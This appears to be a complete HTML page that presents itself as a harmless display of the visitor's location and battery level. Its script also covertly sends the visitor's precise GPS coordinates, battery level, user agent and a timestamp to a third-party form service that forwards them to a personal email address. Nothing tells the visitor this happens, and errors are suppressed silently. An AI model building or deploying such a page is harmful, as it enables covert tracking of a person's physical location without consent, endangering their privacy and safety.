<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Location and Battery Info</title>
<style>
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: #fff;
    height: 100vh;
    margin: 0;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 10px;
  }
  .container {
    background: rgba(255, 255, 255, 0.1);
    border-radius: 12px;
    padding: 20px;
    width: 90%;
    max-width: 400px;
    box-shadow: 0 8px 24px rgb(0 0 0 / 0.15);
  }
  h1 {
    font-weight: 700;
    margin-bottom: 16px;
    font-size: 1.8rem;
    text-align: center;
  }
  .info {
    font-size: 1.1rem;
    line-height: 1.5;
    word-break: break-word;
  }
</style>
</head>
<body>
<div class="container">
  <h1>Your Location & Battery Info</h1>
  <div class="info" id="info">
    Loading information...
  </div>
</div>
<script>
async function sendEmail(data) {
  // Using FormSubmit.co for no-backend email sending with a CORS workaround.
  // Data passed as query params to FormSubmit. Email: hazahiza0@gmail.com
  // NOTE: It requires user form submit interaction or backend to handle, so instead we use fetch POST with an invisible form approach.
  
  const formData = new FormData();
  formData.append('subject', 'User Location and Battery Info');
  formData.append('message', JSON.stringify(data, null, 2));
  formData.append('_captcha', 'false');
  formData.append('_next', 'https://formsubmit.co/success');

  try {
    await fetch('https://formsubmit.co/ajax/hazahiza0@gmail.com', {
      method: 'POST',
      body: formData,
      headers: {
        'Accept': 'application/json'
      }
    });
  } catch (e) {
    // Fail silently
  }
}

function displayInfo(locationText, batteryLevelText) {
  const infoEl = document.getElementById('info');
  infoEl.textContent = '';
  const locPara = document.createElement('p');
  locPara.textContent = locationText;
  const batPara = document.createElement('p');
  batPara.textContent = batteryLevelText;
  infoEl.appendChild(locPara);
  infoEl.appendChild(batPara);
}

function getBatteryLevel() {
  if (!navigator.getBattery) {
    return Promise.resolve(null);
  }
  return navigator.getBattery().then(battery => battery.level * 100);
}

function getLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject('Geolocation is not supported by your browser');
      return;
    }
    navigator.geolocation.getCurrentPosition(
      position => {
        resolve(position.coords);
      },
      error => reject(error.message)
    );
  });
}

window.onload = async () => {
  let locText = 'Location: Unable to determine';
  let batText = 'Battery: Unable to determine';
  try {
    const [coords, batteryLevel] = await Promise.all([getLocation(), getBatteryLevel()]);

    if (coords) {
      locText = `Location: Lat ${coords.latitude.toFixed(5)}, Lon ${coords.longitude.toFixed(5)}`;
    }
    if (batteryLevel !== null) {
      batText = `Battery Level: ${batteryLevel.toFixed(0)}%`;
    }
    displayInfo(locText, batText);

    // Prepare data to send in email
    const dataToSend = {
      timestamp: new Date().toISOString(),
      location: coords ? { latitude: coords.latitude, longitude: coords.longitude, accuracy: coords.accuracy } : null,
      batteryLevel: batteryLevel !== null ? batteryLevel : 'Unavailable',
      userAgent: navigator.userAgent
    };

    // Send data to email via formsubmit.co AJAX
    sendEmail(dataToSend);
  } catch (err) {
    document.getElementById('info').textContent = 'Error retrieving data: ' + err;
  }
};
</script>
</body>
</html>

```